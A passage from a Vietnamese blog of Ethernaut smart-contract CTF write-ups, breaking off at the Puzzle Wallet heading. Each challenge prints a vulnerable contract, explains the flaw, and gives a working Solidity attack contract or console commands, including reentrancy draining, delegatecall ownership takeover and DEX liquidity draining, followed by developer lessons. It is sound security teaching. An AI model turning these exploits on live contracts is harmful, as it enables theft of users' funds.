---
title: "Blockchain Thingies"
date: 2024-04-30
description: Blockchain security notes and Ethernaut challenge writeups.
categories: ["Learning"]
tags: ["Blockchain", "Solidity"]
language: "Vietnamese"
---

## Ethernaut

### Reentrancy

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

```

Ở đây, ta sẽ chú ý đến hàm `call`. Trong Solidity, có 3 hàm dùng để chuyển Ether:

- `transfer` (2300 gas, throws error)
- `send` (2300 gas, returns bool)
- `call` (forward all gas or set gas, returns bool)

Khác với hai hàm còn lại, `call` sẽ không giới hạn số lượng gas sử dụng, ta sẽ sử dụng điều này để thực hiện __Reentrancy attack__. 

Khi server contract gửi ether, contract nhận cần phải có 1 trong 2 hàm là `receive()` và `fallback()`. Do `msg.data = ""` nên contract nhận sẽ dùng hàm `receive` để nhận tiền. Nếu như trong hàm `receive` ta rút tiền lần nữa, vậy sẽ xảy ra việc lặp vô tận và ta có thể rút tiền cho đến khi server contract cạn tiền. 
Một điều nữa trong bài cho phép Reentrancy Attack hoạt động là do server contract cập nhật `balances` sau khi gọi hàm `call`, dẫn đến điều kiện `balances[msg.server] >= _amount` luôn thỏa mãn, vì vậy ta có thể thực hiện hàm `call` liên tục

`Solve.sol`
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "contracts/Reentrancy.sol";

contract Solve {
    Reentrance IReentrance;
    uint256 public __value;

    constructor(address instanceAddress) public payable {
        IReentrance = Reentrance(payable(instanceAddress));
    }
    
    function attack(uint256 _value) external payable {
        IReentrance.donate{value: _value}(address(this));
        IReentrance.withdraw(_value);
        __value = _value;
    }

    receive() external payable {
        uint256 contractValue = address(IReentrance).balance;
        contractValue;
        IReentrance.withdraw(__value);
    }
}
```

- Deploy contract với một lượng wei tùy ý 
- Donate server contract 1 lượng wei tùy ý
- Gọi hàm attack với _value nhỏ hơn lượng wei mà ta donate
- Xong

Bài học:

- Cập nhật các giá trị thay đổi trước khi gọi contract khác 
- Từ tháng 12/2019, người ta khuyến khích sử dụng hàm `call` với [Reentrancy Guard](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol)

### Elevator

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

Với việc interface không được set `view` hoặc `pure`, ta có thể thay đổi state của data

`solve.sol`
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "contracts/Elevator.sol";

contract Solve is Building{
    Elevator IElevator;
    bool public last = false;
    function getInstance(address instanceAddress) public {
        IElevator = Elevator(instanceAddress);
    }

    function isLastFloor(uint256) external returns (bool) {
        bool ret = last;
        last = !last;
        return ret;
    }

    function solve() public {
        IElevator.goTo(0);
    }
}
```

- Khi gọi hàm `isLastFloor` lần đầu, biến `last` đang là `false`, vậy khi gọi hàm lần nữa, `last` sẽ trở thành `true` và ta đã hoàn thành 

Bài học:

- Cần để trạng thái là `view` hoặc `pure` cho interface hoặc abstract nếu không muốn bị thay đổi

### Privacy

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
    */
}
```

Trong bài này, ta chú ý rằng ta có thể xem dữ liệu ở slot bất kì trong storage của contract bằng hàm `web3.eth.getStorageAt` trong `web3js`. Nhưng việc xem ở slot nào mới là điều ta quan tâm.

Các tính chất cơ bản của storage được lưu tại [đây](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html)

Mỗi slot trong storage của solidity có độ lớn là 32 bytes (tương ứng với 256 bits). Solidity sẽ tối ưu việc lưu data vào storage, tức là mỗi biến sẽ được cung cấp một vùng nhớ vừa đủ để lưu, tùy thuộc vào kiểu dữ liệu. Ở trong contract này, ta sẽ có 

```solidity
bool public locked = true; // slot 0
uint256 public ID = block.timestamp; // slot 1
uint8 private flattening = 10; // slot 2
uint8 private denomination = 255; //slot 2
uint16 private awkwardness = uint16(block.timestamp); // slot 2
bytes32[3] private data; // slot 3, 4, 5
```

Do `_key == bytes16(data[2])`, nên ta chỉ cần lấy dữ liệu tại slot 5, rồi convert sang bytes16 là được. Khi convert từ bytes32 sange bytes16, ta lấy 16 bytes đầu của bytes32 là được

Để rõ hơn về cách convert các bạn xem tại https://medium.com/coinmonks/solidity-variables-storage-type-conversions-and-accessing-private-variables-c59b4484c183

```javascript
await web3.eth.getStorageAt(instance, 5, console.log)
//0xa9cf03d7e73fb140b5fe3ef4864a429a80f4db0e7c3b91979d58092e6a7bfa31
await contract.unlock("0xa9cf03d7e73fb140b5fe3ef4864a429a")
```

Bài học:

- Không có gì là private trong solidity blockchain
- Ethernaut có đề xuất 1 bài về cách đọc data trong storage slot https://medium.com/@dariusdev/how-to-read-ethereum-contract-storage-44252c8af925
- Sẽ ra sao nếu array trong bài là dynamic array ? https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html#mappings-and-dynamic-arrays

### Gatekeeper One

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

Ta cần vượt qua 3 điều kiện `gateOne`, `gateTwo` và `gateThree` để có thể thay đổi địa chỉ của `entrant`

- Với `gateOne`, ta chỉ cần gọi server contract thông qua một contract khác là được. Chú ý rằng `tx.origin` có giá trị là địa chỉ đã tạo ra contract (vì vậy giá trị này không thay đổi), còn `msg.sender` có giá trị là địa chỉ người gửi hoặc địa chỉ đã tương tác với server contract (vì vậy có thể thay đổi)

- Với `gateTwo`, ta sẽ sử dụng hàm `address(instanceAddress).call{gas: ?}(abi.encodeWithSignature("enter(bytes8)", key))`. Ở đây, ta sử dụng hàm `call` để kiểm soát số lượng gas sử dụng sao cho `gasleft() % 8191 = 0`. Ta sẽ gọi hàm `enter()` ở server contract với key mà ta tìm được ở dưới

- Với `gateThree`, từ các điều kiện ta có thể suy luận như sau:  
    + 2 bytes đầu của key giống như 2 bytes đầu của `tx.Origin`
    + 2 bytes tiếp theo là null bytes (để đảm bảo điều kiện `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)`)
    + 4 bytes cuối là 4 bytes bất kì

Từ các điều kiện trên, ta có thể dễ dàng gen ra key thỏa mãn 

`solve.sol`
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "contracts/gatekeeper.sol";

contract Solve {
    GatekeeperOne IGatekeeperOne;
    bytes2 public txOrigin;
    bytes public Key;
    uint256 public cnt = 0;
    function getInstance(address instanceAddress) public {
        IGatekeeperOne = GatekeeperOne(instanceAddress);
    }

    function findKey() public {
        txOrigin = bytes2(uint16(uint160(tx.origin)));
        bytes memory concat = bytes.concat(bytes4(0xdeadbeef), bytes2(0x0000), txOrigin);
        Key = concat;
    }

    function check(bytes8 checkKey) public view{ //Hàm này để check xem key tìm được có thỏa mãn không
        require(uint32(uint64(checkKey)) == uint16(uint64(checkKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(checkKey)) != uint64(checkKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(checkKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    }

    function getGasleft() public view returns(uint256){
        return gasleft();
    }

    function exp(bytes8 realKey) public {
        for (uint16 i; i < 1000; i++) 
        {
            (bool success,) = address(IGatekeeperOne).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", realKey));
            if (success) {
                break;
            }
        }
    }
}
```

### Gatekeeper 2

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

Như bài trước, ta cần phải vượt qua 3 điều kiện để qua bài. Ta sẽ phân tích cách để vượt qua từng điều kiện

- Với `gateOne`, tương tự như bài trước, ta chỉ cần gọi contract server từ một contract trung gian là được
- Với `gateTwo`, ta muốn giá trị `extcodesize(caller()) = 0`. Đây là cách để kiểm tra address gọi đến có phải là contract address hay không, nếu là contract address thì sẽ trả về giá trị lớn hơn 0. Tuy nhiên, nếu đọc kĩ [yellow-paper](https://ethereum.github.io/yellowpaper/paper.pdf) ta sẽ thấy chú ý nhỏ:
    ![image](/images/blockchain-thingies/blockchain-thingies_1.png)
    Như vậy, nếu như ta gọi hàm `enter()` trong constructor của contract, `extcodesize` sẽ bằng 0
- Với `gateThree`, đây là phép xor cơ bản: `A xor B = C` thì `B = A xor C`

`solve.sol`
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "contracts/gatekeeper2.sol";

contract Solve {
    constructor(address instanceAddress) {
        GatekeeperTwo IGatekeeperTwo = GatekeeperTwo(instanceAddress);
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        IGatekeeperTwo.enter(key);
    }
}
```

### Naught Coin

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
```

Bài này yêu cầu ta tiêu hết token của chính mình. Tuy nhiên, hàm `transfer` của ERC20 đã bị ghi đè bởi hàm `transfer` của server token. Để có thể gọi hàm `transfer`, ta cần phải vượt qua điều kiện `lockTokens()`, tức là cần đợi 10 năm :)) . Việc đợi này không khả thi nên ta sẽ tìm cách chuyển khác.

Chú ý rằng ERC20 có 2 hàm dùng để chuyển token là `transfer` và `transferFrom`. Cả hai hàm cơ bản đều có chức năng như nhau, đó là chuyển token từ account này sang account khác. Tuy nhiên, hàm `transferFrom` không bị điều kiện `lockTokens` ràng buộc nên ta sẽ sử dụng hàm này để chuyển token.

```javascript
await contract.approve(player, "1000000000000000000000000") //Cho phép player rút một lượng token
await contract.transferFrom(player, instance, "1000000000000000000000000") // Chuyển token của bản thân cho một address khác, ở đây mình sử dụng address của contract luôn
```

Bài học:

- Cần chú ý đến các hàm có chức năng gần giống nhau

### Preservation

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```

Trong bài này, ta cần tìm cách để trở thành owner của server transaction

Ta chú ý đến hàm `delegatecall`: Đây là một hàm low-level, cho phép contract A gọi hàm từ contract B trong khi storage và context của A vẫn giữ nguyên. Khi sử dụng `delegatecall`, một trong những điều ta cần chú ý là layout của các biến. Khi layout của các biến trong A và B khác nhau, việc sử dụng `delegatecall` sẽ không khả thi do ta truy cập sai dữ liệu cần sử dụng.

Quay trở lại challenge, ta thấy hai contract là `LibraryContract` và `Preservation` có cách khai báo biến khác nhau. Chính vì vậy, khi gọi hàm `setTime` qua `delegatecall`, biến `storedTime` trong contract thứ hai sẽ chính là biến `timeZone1Library` (Do đều nằm ở slot 0). Từ đó, khi gọi hàm `setSecondTime`, ta sẽ có thể chỉnh sửa giá trị của `timeZone1Library`.

Do ta có thể thay đổi giá trị của `timeZone1Library`, ta sẽ muốn thay đổi nó trở thành địa chỉ của một contract mà ta có thể điều khiển được. Contract Attack của ta có thể viết như sau:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "contracts/preservation.sol";

contract Solve {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    function setTime(uint256 _time) public {
        owner = tx.origin;
        _time;
    }
}
```

Contract Attack của ta phải có cùng layout các biến tương đương như contract `Preservation`, có cùng tên hàm và kiểu dữ liệu (để có thể gọi được qua hàm `delegatecall`)

Vậy là đã setup xong, ta tiến hành attack như sau

- Load contract `Preservation` và deploy contract `Solve`
- Khi tương tác với contract `Preservation`, ta gọi hàm `setFirstTime` với tham số bất kì, để hai biến `storedTime` và `timeZone1Library` có cùng địa chỉ
- Tiếp theo, ta gọi hàm `setSecondTime` với tham số là `uint256(_address)`, trong đó `_address` là địa chỉ của contract `Solve`. Như vậy, địa chỉ `timeZone1Library` sẽ được thay thế bởi địa chỉ của contract `Solve`
- Bây giờ, ta chỉ cần gọi hàm `setFirstTime` với tham số bất kì, khi đó `delegatecall` sẽ gọi hàm `setTime` trong contract `Solve`, và giúp ta trở thành owner!

Bài học:

- Cẩn thận khi sử dụng `delegatecall`, cần sắp xếp layout của các biến trong các contract được gọi thật cẩn thận
- Nếu có ý định sử dụng nhiều lần một vài hàm trong contract B, việc khai báo B là [__Library__](https://solidity-by-example.org/library/) sẽ tốt hơn nhiều

### Recovery

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
```

Trong bài này, ta cần xóa hết ether trong 1 contract mà server contract đã chuyển đến
Để tìm thấy địa chỉ mà server contract đã chuyển tiền đến, ta sử dụng etherscan. Khi tạo instance, ta vào etherscan để xem server contract đã chuyển tiền cho ai

https://sepolia.etherscan.io/tx/0x24165f30905bf766e104be191c8d020a925d9c19558c96ae3745746c68b6938f

Ta thấy rằng địa chỉ `0x7C4f76d5137C12446226CB22B21622A549A7eD61` đã được nhận 0.001 ether, vậy ta sẽ tìm cách hủy hết tiền của transaction này

Ta sẽ sử dụng hàm `selfdestruct` trong function `destroy` của contract `SimpleToken`. `selfdestruct(_to)` cho phép ta xóa một contract và chuyển toàn bộ ether trong contract đó về địa chỉ `_to`

`solve.sol`
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "contracts/recovery.sol";

contract Solve {
    SimpleToken ISimpleToken;
    function getInstance(address instanceAddress) public {
        ISimpleToken = SimpleToken(payable(instanceAddress));
    }

    function attack(address _address) public {
        ISimpleToken.destroy(payable(_address));
    }
}
```
Vậy chiến thuật của ta sẽ như sau
- Load contract `SimpleToken` từ địa chỉ có 0.001 ether, ở đây là `0x7C4f76d5137C12446226CB22B21622A549A7eD61`
- Khi load xong, ta gọi hàm `destroy` với một địa chỉ bất kì, ở đây mình sẽ sử dụng address của bản thân, như vậy là ta đã hủy hết tiền trong địa chỉ ở trên và chuyển tiền trong địa chỉ đó về ví ta

### Alien Codex

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```

Trong bài này, ta cần chiếm quyền owner của server contract.

Ở đây, ta chú ý `codex` là dynamic array, tức là các giá trị trong `codex` được lưu trong storage với cách tính index khác với fixed array. Cụ thể hơn, `codex[0]` sẽ được lưu ở slot `keccak256(abi.encode(1))`, `codex[1]` được lưu ở slot `keccak256(abi.encode(2))`,...

Khi đã biết cách tính vị trí trong storage của các phần tử `codex`, ta có thể sử dụng hàm `revise()` để thay đổi data của `codex[i]`. Ta sẽ lợi dùng điều này để chiếm quyền owner.

Khi quan sát hàm `retract()`, ta thấy mình có thể gọi hàm này khi nào cũng được. Vậy sẽ ra sao khi ta gọi hàm này khi mảng `codex` của ta không có phần tử nào ? Khi đó sẽ xảy ra tràn số nguyên, và độ dài của mảng `codex` sẽ trở thành `maxint(uint256)`, tức là ta có thể truy cập toàn bộ slot của storage.

Khi đã có thể truy cập toàn bộ slot của storage, ta sẽ tìm `i` sao cho `codex[i]` lưu ở slot 0, tức là slot chứa owner address. Ta chỉnh sửa phần tử `codex[i]` bằng hàm `revise` với address là address của ta. Done!

Bài học:
- Kiểm soát vùng nhớ cẩn thận khi dùng dynamic array
- Biết được cách tính vị trí trong storage của từng phần tử trong dynamic array
- Tránh mọi trường hợp tràn số

### Denial

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

Trong bài này, ta cần làm cho owner không thể gọi được hàm `withdraw()`.

Ta sẽ tìm cách để tăng lượng gas sử dụng khi owner dùng hàm `withdraw()`. Nếu chú ý, ta sẽ thấy server contract sử dụng hàm `call` để gửi tiền đến contract `partner`. Tuy nhiên, hàm call là một hàm khá nguy hiểm. Khi sử dụng hàm `call` để chuyển tiền, contract `partner` sẽ nhận tiền ở hàm `receive()` (do server contract có hàm `receive()`), vậy ta sẽ làm cho hàm `receive()` chứa đoạn code có lỗi, dẫn đến lượng gas cần sử dụng trở nên cực kì lớn, và do đó server contract không thể thực hiện hàm `withdraw()` được.

`solve.sol`
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "contracts/denial.sol";

contract Solve {
    Denial IDenial;
    function getInstance(address instanceAddress) public {
        IDenial = Denial(payable(instanceAddress));
        IDenial.setWithdrawPartner(address(this));
    }

    receive() external payable {
        Denial(payable(msg.sender)).withdraw();
    }
}
```

Bài học:
- Cẩn thận khi sử dụng hàm `call`: có thể dẫn đến reentrancy attack

### Shop
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
```

Bài này yêu cầu ta làm cho biến `isSold` trả về `true` với giá thấp hơn. Nếu để ý, ta sẽ thấy bài này tương tự như bài Elevator, tuy nhiên bây giờ hàm `price()` đã được định nghĩa là `view`.
Ý tưởng tương tự như bài Elevator, đó là ta sẽ override hàm `price` sao cho ta có thể vượt qua điều kiện `if (_buyer.price() >= price && !isSold)`. Ta chú ý rằng function được định nghĩa là `view` vẫn cho phép ta đọc giá trị. Do đó, ta sẽ override hàm `price()` trả về giá trị đủ lớn để vượt qua điều kiện, và sau khi gọi lại lần nữa, giá trị trả về của `price()` sẽ nhỏ hơn `value`.

`solve.sol`
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "contracts/shop.sol";

contract Solve is Buyer {
    Shop IShop;
    function getInstance(address instanceAddress) public {
        IShop = Shop(instanceAddress);
    }

    function price() external view returns(uint256) {
        if (IShop.isSold()) {
            return 0;
        } else {
            return 101;
        }
    }

    function solve() public {
        IShop.buy();
    }
}
```

### Dex
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract Dex is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```

Trong bài này, ta cần rút hết tiền của server contract dựa trên việc thao túng AMM.

Ta sẽ chú ý đến hai hàm `swap(address from, address to, uint256 amount)` và `getSwapPrice(from, to, amount)`:

```solidity
    function swap(address from, address to, uint256 amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }
```

Hàm này cho phép ta chuyển một lượng `amount` token `from` qua token `to` trong ví ta. Lưu ý rằng với mỗi lần swap, liquidity sẽ bị thay đổi do cách tính toán trong hàm `getSwapPrice` và số lượng token của server contract bị thay đổi. Ta sẽ lợi dụng điều này để rút hết token của server contract.

Ta sẽ rút tiền như bảng sau:

![image](/images/blockchain-thingies/blockchain-thingies_2.png)

Lưu ý rằng ta phải cho phép instance address sử dụng token thì mới có thể gọi hàm `swap()` được. Ta sẽ gọi hàm `approve()` với giá trị `value` vừa đủ.

```javascript
await contract.approve(instance, "1000")
await contract.swap(token1, token2, 10)
await contract.swap(token2, token1, 20)
await contract.swap(token1, token2, 24)
await contract.swap(token2, token1, 30)
await contract.swap(token1, token2, 41)
await contract.swap(token2, token1, 45)
```

### DexTwo

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract DexTwo is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function add_liquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapAmount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableTokenTwo is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```

Challenge yêu cầu ta rút hết token 1 và token 2 từ server contract.
Trong bài này, ta chú ý rằng hàm `swap()` không kiểm tra token sử dụng có phải là token của contract hay không, nên ta suy nghĩ đến việc tạo ra một token mới. Khi đó, ta có thể điều khiển được liquidity của dex.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "contracts/dex2.sol";

contract Solve {
    DexTwo Idex;
    address public token1;
    address public token2;
    address public token3;
    function getInstance(address instanceAddress) public {
        Idex = DexTwo(instanceAddress);
        token1 = Idex.token1();
        token2 = Idex.token2();
    }

    function solve() public {
        SwappableTokenTwo Token3 = new SwappableTokenTwo(address(Idex), "", "", 100000);
        token3 = address(Token3);
        Token3.approve(address(Idex), 100000);
        Token3.transfer(address(Idex), 1);
        Idex.swap(token3, token1, 1);
        Idex.swap(token3, token2, 2);
    }
}
```

### Puzzle Wallet

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
